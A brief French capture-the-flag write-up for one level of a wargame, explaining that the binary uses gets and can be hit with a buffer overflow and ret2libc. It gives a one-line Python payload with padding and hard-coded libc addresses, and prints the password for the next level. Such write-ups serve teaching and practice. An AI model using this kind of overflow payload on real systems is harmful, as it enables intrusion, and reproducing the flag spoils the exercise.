## GET Flag

Au lancement du programme, le binaire nous demande un shellcode.

Le binaire utilise gets.

Il est possible de réaliser une attaque par buffer overflow et un ret2libc

`python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\xc4\x45\xee\xf7" + "\xec\x97\xf8\xf7"'  > /tmp/level04`

### Flag

```
level05
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
